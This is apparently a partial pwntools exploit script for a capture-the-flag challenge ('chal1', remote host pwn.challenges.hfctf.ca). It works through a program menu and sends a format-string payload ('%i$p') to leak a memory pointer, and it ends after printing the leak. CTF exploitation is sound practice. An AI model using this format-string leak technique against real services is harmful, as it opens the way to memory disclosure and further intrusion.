from pwn import *
import time

REMOTE = False

context.terminal = 'alacritty'

if REMOTE:
    p = remote("pwn.challenges.hfctf.ca", 1234)
else:
    # p = gdb.debug('./pwn_chall/chal1', 'b *admin+0x1b7')
    p = process('./pwn_chall/chal1')

if REMOTE:
    print('Waiting cause remote')
    time.sleep(10)

for i in range(32):
    print(p.readline())
p.recv()

p.sendline(b'3')
p.readline()
p.sendline(b'1')
p.readline()
p.sendline(b'%i$p')
p.sendline(b'\n')
p.readuntil(b'is wrong: ')
leaked_pointer = p.readline().strip()
print(f'Leaked pointer: {leaked_pointer}')
p.readuntil(b'no:')
p.sendline(b'n')

for i in range(8):
    p.readline()
p.recv()
